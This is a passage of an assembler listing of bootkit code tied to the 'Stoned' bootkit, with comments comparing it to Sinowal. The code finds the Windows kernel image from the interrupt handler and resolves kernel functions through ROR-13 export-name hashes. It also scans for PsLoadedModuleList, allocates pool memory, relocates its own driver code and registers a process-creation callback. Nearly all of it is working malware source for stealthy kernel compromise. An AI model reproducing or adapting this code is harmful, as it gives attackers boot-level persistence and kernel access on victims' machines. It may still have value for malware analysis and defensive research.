   585 000003A9 89E5                    mov ebp,esp   ; = original esp - 32, = 1 PsLoadedModuleList, 6 imports, (6 bytes IDTR just popped from stack)
   586                                  
   587                                  ; get address of Interrupt 0 Handler
   588 000003AB 8B4304                  mov eax,[ebx+0x4]   ; Offset 16..31  [Interrupt Gate Descriptor]
   589 000003AE 668B03                  mov ax,[ebx]    ; Offset 0..15   [Interrupt Gate Descriptor]
   590 000003B1 2500F0FFFF              and eax,0xFFFFF000   ; page base address
   591 000003B6 93                      xchg eax,ebx      ; store address in ebx
   592                                  
   593                                  ; scan memory of Exception Handler for a PE Image -> this will resolve a pointer to ntoskrnl
   594                                  Find_Exception_Handler_PE_Image:
   595 000003B7 81EB00100000            sub ebx,4096  ; next page to check (PE images are always page aligned)
   596 000003BD 66813B4D5A              cmp word [ebx],'MZ'    ; DOS Header found?
   597 000003C2 75F3                    jnz Find_Exception_Handler_PE_Image
   598 000003C4 8B433C                  mov eax,[ebx+0x3c]    ; get address of PE Header (skip DOS Header/Stub)
   599 000003C7 3D00200000              cmp eax,2 * 4096     ; check range (PE Header must be within 8192 bytes)
   600 000003CC 73E9                    jnc Find_Exception_Handler_PE_Image
   601 000003CE 813C0350450000          cmp dword [ebx+eax],'PE'
   602 000003D5 75E0                    jnz Find_Exception_Handler_PE_Image
   603                                  
   604                                  ; obfuscation call
   605                                  ;   [esp] contains then pointer to data
   606                                  ;         has been seen in previous Sinowal version for getting PhysicalDrive string
   607 000003D7 E81C000000              call dword Obfuscation_Call
   608                                  
   609                                  ; standard API hashes (all of ntoskrnl)
   610                                  ; must in the correct order.
   611 000003DC 62E00737                ExAllocatePool    dd    03707E062h  ; ebp-24 203
   612 000003E0 1F9D489D                ExFreePool         dd    09d489d1fh  ; ebp-20 228
   613 000003E4 A8C57D3E                KeLoaderBlock     dd    03E7DC5A8h  ; ebp-16 (unused) 852
   614 000003E8 5F4CD4DC                NtClose           dd    0DCD44C5Fh  ; ebp-12 1879
   615 000003EC 9D8F8803                NtCreateFile      dd    003888F9Dh  ; ebp-8 1888
   616                                  ; 842de457
   617 000003F0 57E42D84                PsSetCreateProcessNotifyRoutine dd    0842de457h  ; ebp-4 1347
   618                                  ;NtReadFile        dd    084FCD516h  ; ebp-4 1995
   619 000003F4 00000000                                  dd    000000000h  ; hash zero terminator (no more hash following)
   620                                  ; here execution flow goes on..
   621                                  Obfuscation_Call:
   622                                  ; get absolute address of PE Image the exception handler exists in, to scan it
   623 000003F8 8D1403                  lea edx,[ebx+eax]                                                               ; edx = absolute address of PE Header
   624 000003FB 8B4A50                  mov ecx,[edx+0x50]                                                              ; SizeOfImage
   625 000003FE 89DF                    mov edi,ebx                                                                     ; edi = address of PE image (of DOS header)
   626 00000400 81C700100000            add edi, 0x1000
   627 00000406 81E700F0FFFF            and edi,0xFFFFF000   ; page base address
   628 0000040C 81E900100000            sub ecx,0x1000
   629                                  
   630                                  ; scan 74 E3 39 05
   631                                  ;_text:004E936E 74 E3                                   jz      short loc_4E9353
   632                                  ;_text:004E9370 39 05 30 CE 54 00                       cmp     ds:_PsLoadedModuleList, eax
   633                                  ; 74 DB 
   634 00000412 B074                    mov al,74h
   635                                  Scan_PsLoadedModuleList:
   636 00000414 F2AE                    repne scasb
   637 00000416 7515                    jnz Image_Parsing_done
   638 00000418 817FFF74E33905          cmp dword [edi-1],0x0539E374
   639 0000041F 75F3                    jnz Scan_PsLoadedModuleList
   640 00000421 66817F0774DB            cmp word [edi + 7],0xdb74
   641 00000427 75EB                    jnz Scan_PsLoadedModuleList
   642                                  
   643                                  Found_Signature:
   644 00000429 4F                      dec edi  ; found the code signature, extract PsLoadedModuleList
   645 0000042A 8B4704                  mov eax,[edi+0x4]    ; store PsLoadedModuleList pointer in eax 
   646                                  
   647                                  Image_Parsing_done:
   648                                  ; use Export Table of the PE Image to resolve the hashes
   649 0000042D 8B5278                  mov edx,[edx+0x78]   ; -> Export Table.Virtual Address
   650 00000430 01DA                    add edx,ebx ; ebx = pointer to DOS Header / image base  (absolute address)
   651 00000432 31C9                    xor ecx,ecx
   652 00000434 49                      dec ecx  ; ecx = -1 = 0FFFFFFFFh
   653                                  
   654                                  ; store the PsLoadedModuleList pointer on stack and resolve hashes
   655 00000435 EB3D                    jmp short Resolve_Next_Hash_StoreOnStack
   656                                  
   657                                  Next_Export:
   658                                  ;  ecx      export counter
   659                                  ;  ebx      still base of ntoskrnl image (points to DOS Header)
   660                                  ;  esi      Export Name
   661                                  ;  edi      Hash Value
   662                                  ;  [esp]    Pointer to Next Hash
   663                                  ;  ebp      Pointer to Stack Variables
   664 00000437 41                      inc ecx   ; next function to generate hash of (ecx = counter)
   665 00000438 8B7220                  mov esi,[edx+0x20] ; Export Directory Table.Name Pointer RVA
   666 0000043B 01DE                    add esi,ebx    ;  (absolute address)
   667 0000043D 8B348E                  mov esi,[esi+ecx*4]   ; lookup the function name in the Name Pointer Table
   668 00000440 01DE                    add esi,ebx     ;  (absolute address)
   669                                  
   670 00000442 31C0                    xor eax,eax   ; will hold character (zero extended)
   671 00000444 31FF                    xor edi,edi   ; will hold hash value
   672                                  
   673                                  Generate_Hash_of_Export_Name:
   674                                  ; generates the hash of the name string, += n >> 13 is used
   675 00000446 AC                      lodsb
   676 00000447 08C0                    or al,al  ; zero termination?
   677 00000449 7407                    jz Hash_Generated 
   678 0000044B C1CF0D                  ror edi,13   ; >> 13 is used (as in previous Sinowal version!)
   679 0000044E 01C7                    add edi,eax    ; add to hash value
   680 00000450 EBF4                    jmp short Generate_Hash_of_Export_Name
   681                                  
   682                                  Hash_Generated:
   683                                  ; krrr
   684 00000452 8B3424                  mov esi,[esp]  ; as discussed, [esp] contains pointer to hashes (because of the call)
   685 00000455 AD                      lodsd   ; get next hash
   686 00000456 09C0                    or eax,eax 
   687 00000458 7421                    jz All_Hashes_Resolved    ; if yes exit loop
   688 0000045A 39C7                    cmp edi,eax       ; found correct hash?
   689 0000045C 75D9                    jnz Next_Export   ; if not => next export
   690 0000045E 893424                  mov [esp],esi     ; update hash pointer
   691 00000461 8B7A24                  mov edi,[edx+0x24]  ; Export Directory Table.Ordinal Table RVA
   692 00000464 01DF                    add edi,ebx    ;   (absolute address)
   693 00000466 0FB7044F                movzx eax,word [edi+ecx*2]        ; lookup in the Ordinal Table to get number in EAT
   694 0000046A 8B7A1C                  mov edi,[edx+0x1c]     ; Export Directory Table.Export Address Table RVA
   695 0000046D 01DF                    add edi,ebx                ;   (absolute address)
   696 0000046F 8B0487                  mov eax,[edi+eax*4]           ; lookup the address
   697 00000472 01D8                    add eax,ebx       ; w00t! found the address, store in eax and store as stack variable!
   698                                  
   699                                  Resolve_Next_Hash_StoreOnStack:
   700 00000474 87FD                    xchg edi,ebp    ; edi to point to stack variables
   701 00000476 AB                      stosd   ; store eax to variable
   702 00000477 87FD                    xchg edi,ebp  ; ebp points now to next variable...!
   703 00000479 EBBC                    jmp short Next_Export
   704                                  
   705                                  All_Hashes_Resolved:
   706 0000047B 90                      nop
   707 0000047C 08C0                    or al, al
   708 0000047E 08C0                    or al, al
   709 00000480 90                      nop
   710                                  ; here the loader ends, relocate the driver code; that code could be out sourced to save bootkit memory
   711                                  ; nt!ExAllocatePool(Type 0, 8192 bytes)
   712 00000481 6800200000              push dword 8192 ; NumberOfBytes = 8192 bytes
   713 00000486 6A00                    push dword 0   ; PoolType = 0
   714 00000488 FF55E8                  call dword [ebp - 24]     ; ExAllocatePool()
   715                                  
   716 0000048B 09C0                    or eax,eax     ; valid buffer?
   717 0000048D 744A                    jz Exit_Bootkit
   718                                  
   719 0000048F 89C7                    mov edi,eax     ; copy the code
   720 00000491 8B75E0                  mov esi,[ebp - 32]       ; the pointer to the import terminator
   721 00000494 81C6B6000000            add esi,Driver_Code - Obfuscation_Call +4    ; use that absolute pointer (+ 4 to seek after the terminator)
   722 0000049A B946000000              mov ecx,Total_End_of_Binary - Driver_Code
   723 0000049F F3A4                    rep movsb
   724                                  
   725                                  ; initialize the data pointer [ebp-32]
   726 000004A1 8945E0                  mov [ebp - 32],eax                                                              ; will point to the data
   727 000004A4 8345E03A                add [ebp - 32],dword Data_Reference - Driver_Code                               ; calculate address from absolute point
   728                                  
   729 000004A8 FFE0                    jmp eax ; jump to execute Driver_Code
   730                                  
   731                                  Driver_Code:
   732 000004AA 90                      nop
   733 000004AB 90                      nop
   734 000004AC 90                      nop
   735                                  ; [ebp - 32] = data reference
   736                                  
   737                                  ; store the ntoskrnl base address
   738 000004AD 8B75E0                  mov esi,[ebp - 32] 
   739 000004B0 891E                    mov [esi + Ntoskrnl_BaseAddress - Data_Reference],ebx                           ; NT-kernel base address
   740                                  
   741                                  ; allocate a memory pool (1024 bytes) for the Stoned Subsystem
   742                                  ; nt!ExAllocatePool(Type 0, 1024 bytes)
   743 000004B2 6800040000              push dword 1024                                                                 ; NumberOfBytes = 1024 bytes
   744 000004B7 6A00                    push dword 0                                                                    ; PoolType = 0
   745 000004B9 FF55E8                  call dword [ebp - 24]                                                           ; ExAllocatePool()
   746 000004BC 09C0                    or eax,eax                                                                      ; valid buffer?
   747 000004BE 7419                    jz Exit_Bootkit
   748 000004C0 894608                  mov [esi + Memory_Pool - Data_Reference],eax                                    ; Memory Pool variable
   749 000004C3 C7460400000000          mov [esi + Callback_NotifyDriverLoad - Data_Reference],dword 0                  ; reset NotifyDriverLoad() callback
   750                                  
   751 000004CA B806000000              mov eax, Data_Reference-MyCreateProcessNotifyRoutine
   752 000004CF 29C6                    sub esi,eax
   753 000004D1 6A00                    push 0
   754 000004D3 56                      push esi
   755 000004D4 FF55FC                  call dword [ebp - 4] 
   756 000004D7 EB00                    jmp Exit_Bootkit
   757                                  
   758                                  ; return from bootkit to Windows
   759                                  Exit_Bootkit:
   760 000004D9 89EC                    mov esp,ebp 
   761 000004DB 9D                      popfd
   762 000004DC 61                      popad
   763 000004DD C3                      ret
   764                                  
   765                                  MyCreateProcessNotifyRoutine:
   766 000004DE 90                      nop
   767 000004DF 90                      nop
   768 000004E0 90                      nop
   769 000004E1 C20C00                  ret 0ch
   770                                  
   771                                  ; data following, [ebp - 32] will point to here
   772                                  Data_Reference:
   773                                  Subsystem_Variables:
   774 000004E4 00000000                Ntoskrnl_BaseAddress        dd  0
   775 000004E8 00000000                Callback_NotifyDriverLoad   dd  0
   776 000004EC 00000000                Memory_Pool                 dd  0
   777                                  
   778                                  Total_End_of_Binary:
   779 000004F0 00<rept>                times 4*1024-($-$$) db 0
